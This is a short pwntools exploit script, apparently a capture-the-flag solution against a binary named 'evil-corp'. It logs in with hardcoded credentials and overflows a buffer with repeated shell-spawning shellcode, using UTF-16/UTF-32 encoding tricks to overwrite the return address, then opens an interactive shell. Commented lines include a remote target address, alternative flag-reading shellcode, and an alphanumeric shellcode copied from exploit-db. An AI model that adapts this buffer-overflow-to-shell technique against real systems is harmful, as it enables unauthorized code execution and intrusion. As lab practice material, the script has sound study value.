from pwn import *

#io = process('./evil-corp')
io = gdb.debug('./evil-corp', 'break main')
#ip, port = '94.237.56.188', 56804
#io = remote(ip, port)

io.sendlineafter('Username: ', 'eliot')
io.sendlineafter('Password: ', '4007')
io.sendlineafter('>> ', '2')
io.recvline()
io.recvline()
io.recvline()
io.recvline()

#buffer offsets (bytes)
#4000*4 + 8 + rip
shellcode = asm(shellcraft.sh()) #44
shellcode += b'\x90'*6

#shellcode = asm(shellcraft.open('flag.txt')) #76
#shellcode += asm(shellcraft.read(3, 'rsp', 64))
#shellcode += asm(shellcraft.write(1, 'rsp', 64))
#shellcode += b'\x90'*4

byte_data = shellcode*160+b'A'*4
buf0 = byte_data.decode('utf-16-le')

byte_data = p64(0x11000)
buf = buf0 + byte_data.decode('utf-32-le')

io.sendline(buf)
io.interactive()
#print(io.recvall())

#https://www.exploit-db.com/exploits/35205
#shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
#payload = shellcode + 'A'*(padding_size - len(shellcode)) + p64(int(rbp, 16)-96)

